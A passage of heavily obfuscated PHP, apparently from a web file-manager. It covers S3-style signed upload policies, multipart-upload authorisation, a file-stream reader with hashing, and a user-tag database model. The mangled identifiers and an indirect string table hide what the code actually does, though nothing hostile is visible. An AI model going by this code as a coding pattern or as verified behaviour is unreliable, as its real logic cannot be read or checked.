gmdate($Ó¶Óù†§[256]); $ÛŞ©éá¬ = gmdate($Ó¶Óù†§[257]); $€öÕ÷ãª = $Ó¶Óù†§[258]; $Š„Õ¥í = $…Õ²·õé . $Ó¶Óù†§[12]; $¿ÎªĞ¼Š = $Ó¶Óù†§[259]; $â×Ç…ê = array($this->accessKey, $ÛŞ©éá¬, $this->region, $Ï–òŸÍÙ, $€öÕ÷ãª); $àù—ã¾ = implode($Ó¶Óù†§[8], $â×Ç…ê); $¯¾óÁ¤ = array($Ó¶Óù†§[260] => gmdate($Ó¶Óù†§[1360], strtotime($Ó¶Óù†§[262])), $Ó¶Óù†§[263] => array(array($Ó¶Óù†§[264] => $this->bucket), array($Ó¶Óù†§[265] => $úŸô¹í), array($Ó¶Óù†§[266], $Ó¶Óù†§[267], $Ó¶Óù†§[12]), array($Ó¶Óù†§[266], $Ó¶Óù†§[268], $Ó¶Óù†§[12]), array($Ó¶Óù†§[266], $Ó¶Óù†§[269], $Ó¶Óù†§[12]), array($Ó¶Óù†§[270] => $¿ÎªĞ¼Š), array($Ó¶Óù†§[271] => $àù—ã¾), array($Ó¶Óù†§[272] => $±ÜĞ‡Å), array($Ó¶Óù†§[273] => $ÉŒşÑ¼), array($Ó¶Óù†§[274] => $Š„Õ¥í))); $³Ş¸Ô¹ƒ = base64_encode(json_encode($¯¾óÁ¤)); $ë¤ûÇ™š = hash_hmac($Ó¶Óù†§[275], $ÛŞ©éá¬, $Ó¶Óù†§[276] . $this->secret, !0); $ü×À»ú¢ = hash_hmac($Ó¶Óù†§[275], $this->region, $ë¤ûÇ™š, !0); $İ¸²°í = hash_hmac($Ó¶Óù†§[275], $Ï–òŸÍÙ, $ü×À»ú¢, !0); $ÔçÏÀ = hash_hmac($Ó¶Óù†§[275], $€öÕ÷ãª, $İ¸²°í, !0); $ıËÈ´ô¶ = hash_hmac($Ó¶Óù†§[275], $³Ş¸Ô¹ƒ, $ÔçÏÀ); $¼–ÚäÈ– = array($Ó¶Óù†§[232] => $Ó¶Óù†§[12], $Ó¶Óù†§[277] => $Ó¶Óù†§[12], $Ó¶Óù†§[265] => $úŸô¹í, $Ó¶Óù†§[270] => $¿ÎªĞ¼Š, $Ó¶Óù†§[278] => $³Ş¸Ô¹ƒ, $Ó¶Óù†§[279] => $àù—ã¾, $Ó¶Óù†§[280] => $±ÜĞ‡Å, $Ó¶Óù†§[281] => $ÉŒşÑ¼, $Ó¶Óù†§[282] => $Š„Õ¥í, $Ó¶Óù†§[283] => $ıËÈ´ô¶, $Ó¶Óù†§[198] => $this->getHost()); return $¼–ÚäÈ–; } public function multiUploadFormData($åàÇ„”‹, $œíÛÉ±ñ = 3600) { $°æÁÚª» =& $_SERVER[ ÇƒŠìÀ]; $áß®êû = gmdate($°æÁÚª»[1465]); $¥¹÷é´ = array(); $ÅÆ˜Àå = $this->client->getUploadId($this->bucket, $åàÇ„”‹, $¥¹÷é´); if (!$ÅÆ˜Àå) { return !1; } return array($°æÁÚª»[240] => $ÅÆ˜Àå, $°æÁÚª»[198] => $this->getHost() . $°æÁÚª»[8] . $this->pathEncode($åàÇ„”‹), $°æÁÚª»[241] => $áß®êû, $°æÁÚª»[96] => $åàÇ„”‹); } public function multiUploadAuthData($Éø’Á§, $¥Îì’ü¢ = array()) { $Õ§½Ñî =& $_SERVER[ ÇƒŠìÀ]; $©éŸüÓà = isset($¥Îì’ü¢[$Õ§½Ñî[177]]) ? $¥Îì’ü¢[$Õ§½Ñî[177]] : $Õ§½Ñî[12]; $ì‘Í¸®ò = $¥Îì’ü¢[$Õ§½Ñî[96]]; unset($¥Îì’ü¢[$Õ§½Ñî[96]]); if (isset($¥Îì’ü¢[$Õ§½Ñî[242]])) { return $this->listUploadParts($ì‘Í¸®ò, $¥Îì’ü¢); } $ãû¯ä = array(); if (isset($¥Îì’ü¢[$Õ§½Ñî[1466]])) { $ãû¯ä[$Õ§½Ñî[1467]] = $¥Îì’ü¢[$Õ§½Ñî[1466]]; } $îû—µÜ = explode($Õ§½Ñî[200], $this->getHost()); $İ­–ş = array($Õ§½Ñî[1468] => $îû—µÜ[1], $Õ§½Ñî[1469] => $Õ§½Ñî[12], $Õ§½Ñî[232] => $Õ§½Ñî[122], $Õ§½Ñî[277] => $¥Îì’ü¢[$Õ§½Ñî[78]]); $Öé¦¯½ = $Õ§½Ñî[245]; $‘ÒËË±Å = $Õ§½Ñî[8] . $this->pathEncode($ì‘Í¸®ò) . $©éŸüÓà; $ú·‡çó¼ = $this->client->__getSignatureV4($ãû¯ä, $İ­–ş, $Öé¦¯½, $‘ÒËË±Å); if (strpos($©éŸüÓà, $Õ§½Ñî[244]) === 0) { if (isset($ãû¯ä[$Õ§½Ñî[1467]])) { $øÉÙ¤ö = $ãû¯ä[$Õ§½Ñî[1467]]; } else { if (isset($ú·‡çó¼[$Õ§½Ñî[1467]])) { $øÉÙ¤ö = $ú·‡çó¼[$Õ§½Ñî[1467]]; } else { $øÉÙ¤ö = hash($Õ§½Ñî[275], $Õ§½Ñî[12]); } } return array($Õ§½Ñî[251] => $ú·‡çó¼[$Õ§½Ñî[251]], $Õ§½Ñî[1467] => $øÉÙ¤ö, $Õ§½Ñî[241] => $ú·‡çó¼[$Õ§½Ñî[1470]]); } return $ú·‡çó¼[$Õ§½Ñî[251]]; } public function listUploadParts($ÎäÀ°ë, $Ä¡¾ßÆ = array()) { $¤Í÷ÄÆ¼ =& $_SERVER[ ÇƒŠìÀ]; $şŞ —Şò = str_replace($¤Í÷ÄÆ¼[252], $¤Í÷ÄÆ¼[12], $Ä¡¾ßÆ[$¤Í÷ÄÆ¼[177]]); $ÙÉœ€Öİ = $this->client->listParts($this->bucket, $ÎäÀ°ë, $şŞ —Şò); if (!$ÙÉœ€Öİ) { return !1; } $¤Ù÷£«° = $¤Í÷ÄÆ¼[1471]; foreach ($ÙÉœ€Öİ as $õù‚îÖÁ) { $¤Ù÷£«° .= $¤Í÷ÄÆ¼[1472] . "\74\x50\x61\162\x74\116\165\x6d\x62\145\x72\x3e{$õù‚îÖÁ[$¤Í÷ÄÆ¼[1428]]}\x3c\57\x50\x61\162\164\116\x75\x6d\142\145\162\76\12" . "\x3c\105\x54\x61\147\x3e{$õù‚îÖÁ[$¤Í÷ÄÆ¼[1429]]}\x3c\x2f\x45\x54\141\x67\x3e\xa" . $¤Í÷ÄÆ¼[1473]; } $¤Ù÷£«° .= $¤Í÷ÄÆ¼[1474]; $»ƒÏüÂ = array(); $“‹“°œš = explode($¤Í÷ÄÆ¼[200], $this->getHost()); $‘ê†î© = array($¤Í÷ÄÆ¼[1468] => $“‹“°œš[1], $¤Í÷ÄÆ¼[232] => $¤Í÷ÄÆ¼[122], $¤Í÷ÄÆ¼[277] => strlen($¤Ù÷£«°)); $Åğ½¼‡– = $¤Í÷ÄÆ¼[243]; $É® ıÑ£ = $¤Í÷ÄÆ¼[8] . $this->pathEncode($ÎäÀ°ë) . $Ä¡¾ßÆ[$¤Í÷ÄÆ¼[177]]; $¶ÃæªÅ = $this->client->__getSignatureV4($»ƒÏüÂ, $‘ê†î©, $Åğ½¼‡–, $É® ıÑ£, $¤Ù÷£«°); return array($¤Í÷ÄÆ¼[251] => $¶ÃæªÅ[$¤Í÷ÄÆ¼[251]], $¤Í÷ÄÆ¼[241] => $¶ÃæªÅ[$¤Í÷ÄÆ¼[1470]], $¤Í÷ÄÆ¼[253] => $ÙÉœ€Öİ, $¤Í÷ÄÆ¼[1467] => $¶ÃæªÅ[$¤Í÷ÄÆ¼[1467]]); } public function link($¿Ğ¦ëóĞ, $àë–Ê†„ = array()) { return parent::link($¿Ğ¦ëóĞ, $àë–Ê†„); } public function fileOut($Ø£ØÁì¥, $íã¤¢µë = false, $Ü×Â• = false, $ŒÅÙÊŸÖ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ ÇƒŠìÀ][1475])) { return parent::fileOutServer($Ø£ØÁì¥, $íã¤¢µë, $Ü×Â•, $ŒÅÙÊŸÖ); } parent::fileOut($Ø£ØÁì¥, $íã¤¢µë, $Ü×Â•, $ŒÅÙÊŸÖ); } public function fileOutImage($–•î”ìÏ, $ºØ´ƒ•ª = 250) { if (strstr($this->endpoint, $_SERVER[ ÇƒŠìÀ][1475])) { return parent::fileOutImageServer($–•î”ìÏ, $ºØ´ƒ•ª); } parent::fileOutImage($–•î”ìÏ, $ºØ´ƒ•ª); } public function fileOutLink($©èş¡üš) { $ÒÍé—¿š =& $_SERVER[ ÇƒŠìÀ]; if (substr($©èş¡üš, 0, 7) == $ÒÍé—¿š[1366]) { $©èş¡üš = $ÒÍé—¿š[1367] . substr($©èş¡üš, 7); } header($ÒÍé—¿š[164] . $©èş¡üš); die; } public function getHost() { $ù¥°Ô¤ =& $_SERVER[ ÇƒŠìÀ]; $Ç£ºïÈœ = str_rtrim(parent::getHost(), $ù¥°Ô¤[8] . $this->bucket); $Ç£ºïÈœ = explode($ù¥°Ô¤[200], $Ç£ºïÈœ); return $Ç£ºïÈœ[0] . $ù¥°Ô¤[200] . $this->bucket . $ù¥°Ô¤[10] . $Ç£ºïÈœ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($’¯”Œî, $ˆÖïÈ’ = 0) { parent::__construct(); $this->source = $’¯”Œî; $this->sourceSize = $ˆÖïÈ’; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($‚Ğ Á‚ = false) { return $this->sourceSize; } public function getContent($ÊÏ©ıæá = false) { return $this->fileSubstr($ÊÏ©ıæá, 0, $this->sourceSize); } public function fileSubstr($¡ÑÓ¯Ó = false, $œ¶Ù¤²ı = 0, $½ï‡Ãµ­ = 0) { if (!$½ï‡Ãµ­) { $½ï‡Ãµ­ = $this->sourceSize; } $¨ªÁ½â = $this->sourceSize - $œ¶Ù¤²ı; if ($½ï‡Ãµ­ >= $¨ªÁ½â) { $½ï‡Ãµ­ = $¨ªÁ½â; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $œ¶Ù¤²ı, $½ï‡Ãµ­); } if ($this->sourceType == self::TYPE_FILE) { if ($½ï‡Ãµ­ <= 0) { return $_SERVER[ ÇƒŠìÀ][12]; } $ˆÛœ÷Êò = ftell($this->source); fseek_64($this->source, $ˆÛœ÷Êò + $œ¶Ù¤²ı); $ÂÃ£‘—¿ = @fread($this->source, $½ï‡Ãµ­); fseek_64($this->source, $ˆÛœ÷Êò); return $ÂÃ£‘—¿; } } public function hashMd5($Şœ‰â = false) { return md5($this->getContent()); } public static function hash($Ä¡¿§½ñ, $èÓ°øƒâ = 0) { $ı’ıÑø = new PathDriverStream($Ä¡¿§½ñ, $èÓ°øƒâ); return $ı’ıÑø->hashSimple($Ä¡¿§½ñ); } public static function md5($¿«ËÅ²», $õôî¤ÅÏ = 0) { $²Ì°”Õà = new PathDriverStream($¿«ËÅ²», $õôî¤ÅÏ); return $²Ì°”Õà->hashMd5($¿«ËÅ²»); } } goto B÷¾µÉ¢; BçêŒ½®˜: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\x61\166"; protected function cacheFunctionAlias($”Ò¬…®—) { $“·Æîïî =& $_SERVER[ ÇƒŠìÀ]; return array($“·Æîïî[1998] => array($“·Æîïî[2390] . USER_ID, $“·Æîïî[1999])); } protected function listData() { $®õÒî¸÷ =& $_SERVER[ ÇƒŠìÀ]; $é•óÁ¾ù = array($®õÒî¸÷[1680] => USER_ID, $®õÒî¸÷[528] => array($®õÒî¸÷[2002], 0)); $»¿Ï¤Éİ = $®õÒî¸÷[2391]; $ÛÛÖş±³ = $this->field($»¿Ï¤Éİ)->where($é•óÁ¾ù)->order($®õÒî¸÷[2005])->select(); return $ÛÛÖş±³ ? $ÛÛÖş±³ : array(); } protected function addToTag($ÛŞü…ó¿, $î¡°†ää) { $ĞŞ¢ÏË² =& $_SERVER[ ÇƒŠìÀ]; if (!Model($ĞŞ¢ÏË²[2148])->listData($î¡°†ää)) { return !1; } if (is_numeric($ÛŞü…ó¿)) { $©‰îØŸı = Model($ĞŞ¢ÏË²[854])->pathInfo($ÛŞü…ó¿); if (!$©‰îØŸı) { return !1; } } else { $©‰îØŸı = IO::infoSimple($ÛŞü…ó¿); if (!$©‰îØŸı) { return !1; } $áŠ¾ğ£ = $©‰îØŸı[$ĞŞ¢ÏË²[32]]; $‚¬‰œ´Ä = $©‰îØŸı[$ĞŞ¢ÏË²[33]]; if (isset($©‰îØŸı[$ĞŞ¢ÏË²[455]])) { $‚¬‰œ´Ä = $©‰îØŸı[$ĞŞ¢ÏË²[455]] == $ĞŞ¢ÏË²[90] ? $ĞŞ¢ÏË²[77] : $ĞŞ¢ÏË²[216]; } } $Èå€ÕŸ = array($ĞŞ¢ÏË²[1680] => USER_ID, $ĞŞ¢ÏË²[528] => $î¡°†ää, $ĞŞ¢ÏË²[465] => $ÛŞü…ó¿, $ĞŞ¢ÏË²[466] => $‚¬‰œ´Ä ? $‚¬‰œ´Ä : $ĞŞ¢ÏË²[460], $ĞŞ¢ÏË²[464] => $áŠ¾ğ£ ? $áŠ¾ğ£ : $ĞŞ¢ÏË²[12], $ĞŞ¢ÏË²[1891] => 0); if ($this->where($Èå€ÕŸ)->find()) { return !1; } return $this->add($Èå€ÕŸ); } protected function removeFromTag($‚ÌßÙ®Ï, $ÓË¾×ı¯) { $ùŸ‚ëŒı =& $_SERVER[ ÇƒŠìÀ]; if (!Model($ùŸ‚ëŒı[2148])->listData($ÓË¾×ı¯)) { return !1; } if (is_array($‚ÌßÙ®Ï)) { $‚ÌßÙ®Ï = array($ùŸ‚ëŒı[7], $‚ÌßÙ®Ï); } $»®Ä‘‹À = array($ùŸ‚ëŒı[1680] => USER_ID, $ùŸ‚ëŒı[528] => $ÓË¾×ı¯, $ùŸ‚ëŒı[465] => $‚ÌßÙ®Ï); return $this->where($»®Ä‘‹À)->delete(); } protected function removeByTag($¿üŠÂ·) { $àÙÚºÊÅ =& $_SERVER[ ÇƒŠìÀ]; if (!$¿üŠÂ·) { return !1; } $³¨ÂşÜ¼ = array($àÙÚºÊÅ[1680] => USER_ID, $àÙÚºÊÅ[528] => $¿üŠÂ·); return $this->where($³¨ÂşÜ¼)->delete(); } protected function removeBySource($Å’™¦Í”) { $Ì¨èÑºÜ =& $_SERVER[ ÇƒŠìÀ]; if (is_array($Å’™¦Í”)) { $Å’™¦Í” = array($Ì¨èÑºÜ[7], $Å’™¦Í”); } $‘áÆÃüï = array($Ì¨èÑºÜ[1680] => USER_ID, $Ì¨èÑºÜ[528] => array($Ì¨èÑºÜ[1049], 0), $Ì¨èÑºÜ[465] => $Å’™¦Í”); return $this->where($‘áÆÃüï)->delete(); } }